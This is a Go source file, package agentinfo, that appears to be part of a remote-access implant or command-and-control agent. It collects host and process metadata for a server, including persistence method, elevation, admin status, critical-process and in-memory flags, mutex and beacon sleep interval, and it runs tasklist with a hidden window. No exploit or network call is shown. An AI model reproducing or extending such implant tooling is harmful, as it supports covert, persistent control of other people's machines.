package agentinfo

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// Info holds extensible runtime metadata about the agent process.
// Plugins receive this via HostInfo and the server stores it in the Hello.
type Info struct {
	PID               int    `json:"pid"`
	PPID              int    `json:"ppid"`
	ExePath           string `json:"exePath"`
	ExeDir            string `json:"exeDir"`
	ExeName           string `json:"exeName"`
	WorkingDir        string `json:"workingDir"`
	PersistenceMethod string `json:"persistenceMethod"`
	UptimeSeconds     int64  `json:"uptimeSeconds"`
	StartTime         int64  `json:"startTime"`
	Elevation         string `json:"elevation"`
	IsAdmin           bool   `json:"isAdmin"`
	CriticalProcess   bool   `json:"criticalProcess"`
	InMemory          bool   `json:"inMemory"`
	Mutex             string `json:"mutex,omitempty"`
	SleepSeconds      int    `json:"sleepSeconds"`
	UserDomain        string `json:"userDomain,omitempty"`
	UserName          string `json:"userName"`
	ParentProcessName string `json:"parentProcessName,omitempty"`
	Platform          string `json:"platform"`
}

var processStartTime = time.Now()

func Collect(isAdmin bool, elevation string, criticalProcess bool, inMemory bool, mutex string, sleepSeconds int) Info {
	info := Info{
		PID:             os.Getpid(),
		PPID:            os.Getppid(),
		UptimeSeconds:   int64(time.Since(processStartTime).Seconds()),
		StartTime:       processStartTime.Unix(),
		Elevation:       elevation,
		IsAdmin:         isAdmin,
		CriticalProcess: criticalProcess,
		InMemory:        inMemory,
		Mutex:           mutex,
		SleepSeconds:    sleepSeconds,
		Platform:        runtime.GOOS,
	}

	if exePath, err := os.Executable(); err == nil {
		if resolved, err := filepath.EvalSymlinks(exePath); err == nil {
			info.ExePath = resolved
		} else {
			info.ExePath = exePath
		}
		info.ExeDir = filepath.Dir(info.ExePath)
		info.ExeName = filepath.Base(info.ExePath)
	}

	if wd, err := os.Getwd(); err == nil {
		info.WorkingDir = wd
	}

	info.UserName = currentUser()
	info.UserDomain = currentDomain()
	info.PersistenceMethod = detectPersistenceMethod()
	info.ParentProcessName = parentProcessName()

	return info
}

func currentUser() string {
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	return "unknown"
}

func currentDomain() string {
	if d := os.Getenv("USERDOMAIN"); d != "" {
		return d
	}
	return ""
}

func parentProcessName() string {
	if runtime.GOOS != "windows" {
		return ""
	}
	cmd := exec.Command("tasklist", "/FI", "PID eq "+strconv.Itoa(os.Getppid()), "/FO", "CSV", "/NH")
	hideCmdWindow(cmd)
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	output := strings.TrimSpace(string(out))
	if output == "" || strings.HasPrefix(output, "INFO:") {
		return ""
	}
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		parts := strings.Split(line, ",")
		if len(parts) >= 1 {
			name := strings.Trim(parts[0], "\"")
			if name != "" && !strings.HasPrefix(name, "INFO:") {
				return name
			}
		}
	}
	return ""
}

func detectPersistenceMethod() string {
	if runtime.GOOS == "windows" {
		return detectWindowsPersistence()
	}
	if runtime.GOOS == "darwin" {
		return detectDarwinPersistence()
	}
	if runtime.GOOS == "linux" {
		return detectLinuxPersistence()
	}
	return ""
}
